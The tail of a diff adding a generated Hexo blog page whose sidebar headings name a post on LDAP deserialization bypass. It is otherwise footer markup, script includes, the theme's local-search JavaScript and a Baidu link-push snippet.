href="#NativeLibLoader"><span class="nav-number">1.3.1.3.7.</span> <span class="nav-text">NativeLibLoader</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LDAP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.2.</span> <span class="nav-text">LDAP反序列化绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">示例</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1azysugar</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fas fa-chart-area"></i>
+    </span>
+    
+      <span class="post-meta-item-text">全站共计字数&#58;</span>
+    
+    <span title="全站共计字数"></span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fas fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    <div class="sidebar_wo">
+      <div id="leimu">
+        <img src="/images/b2t/leimuA.png" alt="雷姆" onmouseover="this.src='/images/b2t/leimuB.png'" onmouseout="this.src='/images/b2t/leimuA.png'" title="回到顶部">
+      </div>
+      <div class="sidebar_wo" id="lamu">
+        <img src="/images/b2t/lamuA.png" alt="雷姆" onmouseover="this.src='/images/b2t/lamuB.png'" onmouseout="this.src='/images/b2t/lamuA.png'" title="回到底部">
+      </div>
+    </div>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fas fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="far fa-frown fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+<!-- 图片轮播js文件cdn -->
+<script src="https://cdn.bootcss.com/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+
+<!-- 剪贴板js文件 -->
+<script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>
+
+<script>
+
+<!-- 头像挂件及自动刷新 -->
+
+
+</script>
+
+<!-- 自定义的js文件 -->
+<script type="text/javascript" src="/js/src/custom.js"></script>
+</body>
+</html>
